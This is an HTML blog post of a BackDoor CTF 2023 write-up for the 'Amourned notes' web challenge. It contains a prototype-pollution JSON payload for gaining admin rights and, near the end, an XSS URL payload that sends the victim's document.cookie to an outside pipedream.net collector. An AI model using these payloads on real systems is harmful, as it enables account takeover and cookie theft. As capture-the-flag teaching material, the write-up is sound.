@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Backdoor CTF 2023 | Logo</title>
+<meta name="keywords" content="">
+<meta name="description" content="Write up collection for BackDoor CTF 2023">
+<meta name="author" content="FireLord">
+<link rel="canonical" href="//localhost:1313/posts/backdoor-ctf-2023/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="//localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="//localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="//localhost:1313/posts/backdoor-ctf-2023/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="//localhost:1313/" accesskey="h" title="Logo (Alt + H)">Logo</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="//localhost:1313/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="//localhost:1313/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="//localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="//localhost:1313/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Backdoor CTF 2023
+    </h1>
+    <div class="post-description">
+      Write up collection for BackDoor CTF 2023
+    </div>
+    <div class="post-meta"><span title='2023-12-15 00:20:16 +0700 +07'>December 15, 2023</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;FireLord
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#webamourned-notes" aria-label="Web/Amourned notes">Web/Amourned notes</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="webamourned-notes">Web/Amourned notes<a hidden class="anchor" aria-hidden="true" href="#webamourned-notes">#</a></h1>
+<p>For this challenge there is two parts . Figuring how to write a note as admin and then exploit an xss in vite (dependancy of the project) . Remember boys and gal always run npm audit</p>
+<p>Below is the function on the server to create new user</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#34;/create&#34;</span>, <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">next</span>) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">obj</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">duplicate</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">uname</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">pass</span> <span style="color:#f92672">==</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">PASSWORD</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">isAdmin</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">isAdmin</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">newEntry</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>;
+</span></span></code></pre></div><p>This is classic proton pollution . It happen in js when user input &ldquo;__ proto__&rdquo;
+See more here . Lucky i remember this because there is &ldquo;blade-runner&rdquo; challenge from mapleCTF 2023 that has same challenge</p>
+<p>So if you input this payload you can effectively create a note as admin</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#e6db74">&#34;__proto__&#34;</span><span style="color:#f92672">:</span>{ 
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;uname&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span>, <span style="color:#e6db74">&#34;isAdmin&#34;</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">true</span> 
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>,<span style="color:#e6db74">&#34;pass&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Doe&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Your note...asd&#34;</span>}
+</span></span></code></pre></div><p>With a quick look to the source code , we can see the flag is set in cookie so we will need to dump it . The question is how ???</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span> <span style="color:#75715e">// Set Flag
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#a6e22e">setCookie</span>({
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;flag&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">httpOnly</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">false</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">value</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">CONFIG</span>.<span style="color:#a6e22e">APPFLAG</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">url</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">CONFIG</span>.<span style="color:#a6e22e">APPURL</span>
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// Visit URL from user
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`bot visiting </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">urlToVisit</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">page</span>.<span style="color:#66d9ef">goto</span>(<span style="color:#a6e22e">urlToVisit</span>, {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">waitUntil</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;networkidle2&#39;</span>
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#66d9ef">new</span> Promise(<span style="color:#a6e22e">resolve</span> =&gt; <span style="color:#a6e22e">setTimeout</span>(<span style="color:#a6e22e">resolve</span>, <span style="color:#ae81ff">5000</span>));
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">It</span> <span style="color:#a6e22e">does</span> <span style="color:#a6e22e">filter</span> <span style="color:#a6e22e">all</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">sensitive</span> <span style="color:#a6e22e">possible</span> <span style="color:#a6e22e">thing</span> <span style="color:#a6e22e">from</span> <span style="color:#a6e22e">html</span> <span style="color:#a6e22e">input</span> <span style="color:#a6e22e">at</span> <span style="color:#e6db74">&#39;/posts&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">escapeHtmlReplaceMap</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&amp;&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;`&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&lt;&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&gt;&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;;&#39;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;!&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;-&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;*&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;[&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;{&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;}&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;|&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#34;&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;(&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;)&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;&#34;</span>,
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   * @param {string} string
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   * @returns {string}
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">   */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">export</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">escapeHtml</span>(<span style="color:#a6e22e">string</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">string</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/[&amp;&#39;`&#34;&lt;&gt;]/g</span>, (<span style="color:#a6e22e">match</span>) =&gt; <span style="color:#a6e22e">escapeHtmlReplaceMap</span>[<span style="color:#a6e22e">match</span>])
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>npm audit command output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>└─$ npm audit 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>vite  4.4.0 - 4.4.11
+</span></span><span style="display:flex;"><span>Severity: moderate
+</span></span><span style="display:flex;"><span>Vite XSS vulnerability in <span style="color:#e6db74">`</span>server.transformIndexHtml<span style="color:#e6db74">`</span> via URL payload - https://github.com/advisories/GHSA-92r3-m2mg-pj97        
+</span></span><span style="display:flex;"><span>fix available via <span style="color:#e6db74">`</span>npm audit fix<span style="color:#e6db74">`</span>
+</span></span><span style="display:flex;"><span>node_modules/vite
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> moderate severity vulnerability
+</span></span></code></pre></div><p>So <code>npm audit</code>  was able to id one vulnerbility . After reading the CVE POC .The payload need to input to admin /report</p>
+<pre tabindex="0"><code>http://localhost:3000/posts/&lt;code&gt;/?&#34;&gt;&lt;/script&gt;&lt;script&gt;window.location.href=`https://eno02ecudm9nm.x.pipedream.net/?cookie=${btoa(document.cookie) }` &lt;/script&gt;
+</code></pre><p><img loading="lazy" src="image.png" alt="H"  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="//localhost:1313/posts/sd-ctf-2024/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>San Diego CTF 2024 writeups</span>
+  </a>
+  <a class="next" href="//localhost:1313/posts/cyber-apocalypse-2024/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Backdoor CTF 2023</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="//localhost:1313/">Logo</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
